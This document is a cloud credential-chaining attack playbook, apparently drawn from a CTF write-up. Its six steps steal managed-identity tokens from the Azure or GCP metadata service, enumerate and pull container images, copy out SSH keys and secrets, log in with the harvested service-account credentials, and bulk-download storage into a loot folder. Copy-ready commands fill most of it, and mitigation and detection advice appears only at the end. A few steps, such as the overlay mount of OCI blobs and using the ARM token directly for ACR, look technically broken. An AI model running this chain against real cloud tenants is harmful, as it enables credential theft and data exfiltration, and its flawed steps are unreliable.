# Cloud Credential Chaining — IMDS → ServiceAccount → ArtifactRegistry → Storage

## Chain Summary
**Entry Point:** Managed Identity token from Azure IMDS or GCP metadata  
**Severity:** High  
**Source:** https://kabinet.gitbook.io/ctf-writeup/2025/thuderdome/crossing-the-great-divide

Exploits multi-cloud token chaining: steals Managed Identity token from IMDS/GCP metadata, uses it to access cloud artifact registries (ACR/GCR), extracts service account credentials embedded in container images, and leverages those credentials for lateral movement to cloud storage.

---

## Chain: Managed Identity IMDS Token → Artifact Registry Access → Image Pull → Service Account Extraction → Storage Access

### [1] Managed Identity Token Extraction from IMDS / GCP Metadata
- **Trigger:** Compromised compute resource (Azure VM/App Service or GCP VM/Cloud Run); need to escalate via managed identity
- **Prereq:** RCE/shell on cloud compute resource; IMDS endpoint reachable (169.254.169.254 for Azure, 169.254.169.254 for GCP)
- **Method (Azure IMDS):**
  ```bash
  # Query Azure IMDS for managed identity token (ARM scope)
  curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq .
  
  # Response includes: access_token, refresh_token, expires_on
  ARM_TOKEN=$(curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    | jq -r '.access_token')
  ```

**Method (GCP Metadata Service):**
  ```bash
  # Query GCP metadata for service account token
  curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq .
  
  # Response includes: access_token, expires_in, token_type
  GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
    | jq -r '.access_token')
  ```
- **Yields:** Service account / managed identity token with cloud resource access permissions

### [2] Enumerate Azure Container Registry (ACR) / GCP Container Registry (GCR)
- **Trigger:** Managed identity token obtained; need to find accessible artifact registries
- **Prereq:** Management/container registry read token; registry name/subscription known or discoverable
- **Method (Azure ACR):**
  ```bash
  # List available registries in subscription
  curl -s -H "Authorization: Bearer $ARM_TOKEN" \
    "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.ContainerRegistry/registries?api-version=2021-06-01-preview" \
    | jq '.value[] | {id, name, loginServer}'
  
  # Example: containerregistry.azure.com
  REGISTRY="<registry_name>.azurecr.io"
  ```

**Method (GCP GCR):**
  ```bash
  # List GCP storage buckets (GCR uses Cloud Storage buckets)
  curl -s -H "Authorization: Bearer $GCP_TOKEN" \
    "https://www.googleapis.com/storage/v1/b" \
    | jq '.items[] | select(.name | contains("artifacts")) | {name, location}'
  
  # GCR registries: gcr.io, us.gcr.io, eu.gcr.io, asia.gcr.io
  ```
- **Yields:** Container registry endpoints; registry names; project/subscription context

### [3] List Container Images in Registry
- **Trigger:** Registry endpoint identified; need to enumerate available images for credential extraction
- **Prereq:** Registry access token; registry endpoint; container repo names known or enumerable
- **Method (Azure ACR):**
  ```bash
  # Login to ACR with managed identity token (convert ARM token to ACR token)
  # Azure CLI abstracts this, but manual approach:
  az acr repository list --name <REGISTRY_NAME> --username 00000000-0000-0000-0000-000000000000 --password $ARM_TOKEN
  
  # Via REST API
  curl -s -H "Authorization: Bearer $ARM_TOKEN" \
    "https://<REGISTRY_NAME>.azurecr.io/acr/v1/_catalog" \
    | jq '.repositories[] | select(. | contains("service") or contains("app"))'
  ```

**Method (GCP GCR):**
  ```bash
  # List images in GCR
  curl -s -H "Authorization: Bearer $GCP_TOKEN" \
    "https://gcr.io/v2/<PROJECT_ID>/_catalog" \
    | jq '.repositories'
  
  # Or via gcloud
  gcloud container images list --project <PROJECT_ID> --repository-format=gcr
  ```
- **Yields:** List of container image repositories; identify high-value images (api, backend, worker, auth)

### [4] Pull Container Image & Extract Service Account Credentials
- **Trigger:** Target image identified (e.g., `backend-api`, `worker-service`); need to extract embedded credentials
- **Prereq:** Container image pull access; Docker/OCI tools available; image likely contains service account keys, env files, or config files
- **Method:**
  ```bash
  # Authenticate docker CLI to ACR
  az acr login --name <REGISTRY_NAME>
  
  # Or manual authentication
  docker login -u 00000000-0000-0000-0000-000000000000 -p "$ARM_TOKEN" <REGISTRY_NAME>.azurecr.io
  
  # Pull image
  docker pull <REGISTRY_NAME>.azurecr.io/<REPO>:<TAG>
  
  # Extract filesystem and search for credentials
  container_id=$(docker run -d <REGISTRY_NAME>.azurecr.io/<REPO>:<TAG> /bin/sh -c 'sleep 1000')
  docker cp $container_id:/app/config.json ./
  docker cp $container_id:/root/.ssh/id_rsa ./
  docker cp $container_id:/etc/secrets/ ./secrets/
  docker stop $container_id
  
  # Alternative: Use skopeo to copy image without Docker daemon
  skopeo copy docker://<REGISTRY_NAME>.azurecr.io/<REPO>:<TAG> oci:image-dir
  
  # Mount and inspect
  mkdir -p /mnt/oci
  mount -t overlay overlay /mnt/oci -o lowerdir=image-dir/blobs:image-dir/layers
  grep -r "secret\|password\|key\|credential" /mnt/oci/ --include="*.json" --include="*.env" --include="*.conf"
  ```
- **Yields:** Service account credentials, API keys, connection strings embedded in image (config files, env vars, SSH keys)

### [5] Authenticate with Extracted Service Account Credentials
- **Trigger:** Service account credentials extracted (GCP SA JSON key or Azure app credentials); need to use for lateral movement
- **Prereq:** Service account key file or credentials; knowledge of service account permissions
- **Method (GCP Service Account Key):**
  ```bash
  # Extracted key file (usually as .json)
  # ~/extracted_sa_key.json
  export GOOGLE_APPLICATION_CREDENTIALS=~/extracted_sa_key.json
  
  # Test authentication
  gcloud auth application-default print-access-token
  gcloud compute instances list --project <PROJECT_ID>
  ```

**Method (Azure Service Principal):**
  ```bash
  # Extracted Azure app credentials (client_id, client_secret, tenant_id)
  az login --service-principal -u <CLIENT_ID> -p <CLIENT_SECRET> --tenant <TENANT_ID>
  az account show
  ```
- **Yields:** Authenticated context as the service account; full permissions of the extracted credential

### [6] Cloud Storage Access (GCS / Azure Blob Storage Enumeration & Exfil)
- **Trigger:** Service account authenticated; need to access cloud storage for flag/data exfiltration
- **Prereq:** Service account has Storage read permissions; bucket/container names known or enumerable
- **Method (GCP Cloud Storage):**
  ```bash
  # List storage buckets
  gsutil ls
  
  # List contents of sensitive bucket
  gsutil ls gs://secrets-bucket/
  gsutil ls gs://flags/
  
  # Download files
  gsutil cp gs://secrets-bucket/app-secrets.env ./
  gsutil cp gs://flags/flag.txt ./
  
  # Or via gcloud
  gcloud storage ls gs://secrets-bucket/
  gcloud storage cp gs://secrets-bucket/* ./loot/
  ```

**Method (Azure Blob Storage):**
  ```bash
  # List storage accounts accessible to service account
  az storage account list --query "[].{Name:name, ResourceGroup:resourceGroup}" -o table
  
  # Extract storage keys if possible
  az storage account keys list --account-name <ACCOUNT> --resource-group <RG>
  
  # List containers
  az storage container list --account-name <ACCOUNT> --query "[].name" -o table
  
  # Download files
  az storage blob download --container-name <CONTAINER> --name <BLOB_NAME> \
    --account-name <ACCOUNT> --file ./loot/flag.txt
  
  # Bulk download
  az storage blob download-batch --destination ./loot/ --source <CONTAINER> \
    --account-name <ACCOUNT>
  ```
- **Yields:** Sensitive data, credentials, flags, configuration files exfiltrated from cloud storage

---

## Mitigation & Detection

**Prevention:**
- **Workload Identity Federation (Azure, GCP):** Replace long-lived service account keys with federated tokens; revoke persistent keys
- **Managed Identity RBAC:** Restrict managed identity scope to specific resources; use custom roles with least privilege
- **Container Image Security:**
  - Don't embed secrets in images; use Image Scanning tools (Trivy, Snyk, Azure Defender for Containers)
  - Use multi-stage builds to exclude dev/test credentials from final image
  - Scan for exposed secrets (AWS keys, GCP SA keys, passwords) before pushing to registry
- **Registry Access Control:**
  - Restrict ACR/GCR pulls to specific workloads/namespaces
  - Disable anonymous pulls; enforce authentication
  - Use token-based auth with limited lifetime
- **Storage Access Control:**
  - Implement IAM roles with minimal permissions (e.g., Storage Blob Reader, not Owner)
  - Enable service account key rotation policies
  - Disable anonymous access to buckets/containers
- **Network Segmentation:** Restrict access to metadata endpoints (IMDS) via network policies or App Armor/SELinux

**Detection:**
- **IMDS Access Monitoring:** Alert on token requests from non-standard processes or unusual source IPs
- **Container Registry Audit:** Log all image pulls; alert on unusual image access patterns
- **Service Account Activity:** Monitor GCP audit logs for service account authentication from unexpected sources
- **Azure Managed Identity Tokens:** Alert on high-volume token requests or tokens obtained by non-system processes
- **Storage Access Logs:** Monitor for bulk downloads or unusual access patterns (e.g., reads from multiple files not typical for workload)
- **Container Image Scanning:** Automated scanning for embedded secrets (regex patterns: AWS keys, GCP SA keys, passwords) before push to registry

---

## References
- Azure Managed Identity IMDS: https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
- GCP Service Account Tokens: https://cloud.google.com/docs/authentication/service-accounts
- Container Image Security: https://docs.docker.com/develop/develop-images/build_best_practices/
- GCP Cloud Storage Access Control: https://cloud.google.com/storage/docs/access-control
- Azure Storage RBAC: https://learn.microsoft.com/en-us/azure/storage/common/storage-auth-aad-rbac-portal
